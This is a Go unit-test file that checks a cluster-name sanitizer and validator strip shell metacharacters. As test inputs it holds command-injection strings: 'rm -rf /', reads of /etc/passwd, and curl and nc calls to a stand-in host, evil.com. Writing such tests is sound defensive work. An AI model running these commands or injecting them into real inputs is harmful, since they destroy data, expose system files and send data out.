package nsk

import (
	"fmt"
	"strings"
	"testing"
)

func TestSanitizeClusterName(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "valid cluster name",
			input:    "c1-sv5",
			expected: "c1-sv5",
		},
		{
			name:     "valid cluster name with underscores",
			input:    "test_cluster_1",
			expected: "test_cluster_1",
		},
		{
			name:     "valid cluster name with dots",
			input:    "cluster.example.com",
			expected: "cluster.example.com",
		},
		{
			name:     "cluster name with spaces",
			input:    "test cluster",
			expected: "testcluster",
		},
		{
			name:     "cluster name with special characters",
			input:    "test@cluster#1",
			expected: "testcluster1",
		},
		{
			name:     "cluster name with command injection attempt",
			input:    "cluster; rm -rf /",
			expected: "clusterrm-rf",
		},
		{
			name:     "cluster name with pipe injection",
			input:    "cluster | cat /etc/passwd",
			expected: "clustercatetcpasswd",
		},
		{
			name:     "cluster name with backticks",
			input:    "cluster`whoami`",
			expected: "clusterwhoami",
		},
		{
			name:     "cluster name with dollar signs",
			input:    "cluster$USER",
			expected: "clusterUSER",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "",
		},
		{
			name:     "only special characters",
			input:    "!@#$%^&*()",
			expected: "",
		},
		{
			name:     "mixed valid and invalid characters",
			input:    "test-cluster_1.example!@#",
			expected: "test-cluster_1.example",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizeClusterName(tt.input)
			if result != tt.expected {
				t.Errorf("sanitizeClusterName(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestSanitizeClusterNameSecurity(t *testing.T) {
	// Test various command injection patterns
	maliciousInputs := []string{
		"; rm -rf /",
		"&& curl evil.com",
		"| nc evil.com 1234",
		"`whoami`",
		"$(cat /etc/passwd)",
		"${USER}",
		"> /dev/null",
		"< /etc/passwd",
		"|| echo hacked",
		"& sleep 10",
		"\n rm -rf /",
		"\r\n curl evil.com",
		"; echo vulnerable > /tmp/test",
	}

	for _, input := range maliciousInputs {
		t.Run("malicious_input_"+input, func(t *testing.T) {
			result := sanitizeClusterName(input)

			// Ensure no shell metacharacters remain
			dangerousChars := []string{";", "&", "|", "`", "$", "(", ")", ">", "<", "\n", "\r", " "}
			for _, char := range dangerousChars {
				if strings.Contains(result, char) {
					t.Errorf("sanitizeClusterName(%q) = %q still contains dangerous character %q", input, result, char)
				}
			}
		})
	}
}

func TestClusterInfoValidation(t *testing.T) {
	tests := []struct {
		name        string
		clusterInfo *ClusterInfo
		expectError bool
	}{
		{
			name: "valid cluster info",
			clusterInfo: &ClusterInfo{
				Name:        "test-cluster",
				KubeConfig:  "/path/to/kubeconfig",
				Environment: "test",
			},
			expectError: false,
		},
		{
			name: "empty cluster name",
			clusterInfo: &ClusterInfo{
				Name:        "",
				KubeConfig:  "/path/to/kubeconfig",
				Environment: "test",
			},
			expectError: true,
		},
		{
			name: "empty kubeconfig path",
			clusterInfo: &ClusterInfo{
				Name:        "test-cluster",
				KubeConfig:  "",
				Environment: "test",
			},
			expectError: true,
		},
		{
			name: "malicious cluster name",
			clusterInfo: &ClusterInfo{
				Name:        "test; rm -rf /",
				KubeConfig:  "/path/to/kubeconfig",
				Environment: "test",
			},
			expectError: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateClusterInfo(tt.clusterInfo)
			if tt.expectError && err == nil {
				t.Error("Expected validation error but got none")
			}
			if !tt.expectError && err != nil {
				t.Errorf("Expected no validation error but got: %v", err)
			}
		})
	}
}

// validateClusterInfo is a helper function that would be used to validate cluster info
func validateClusterInfo(info *ClusterInfo) error {
	if info.Name == "" {
		return fmt.Errorf("cluster name cannot be empty")
	}

	if info.KubeConfig == "" {
		return fmt.Errorf("kubeconfig path cannot be empty")
	}

	// Check if cluster name contains potentially dangerous characters
	sanitized := sanitizeClusterName(info.Name)
	if sanitized != info.Name {
		return fmt.Errorf("cluster name contains invalid characters")
	}

	return nil
}
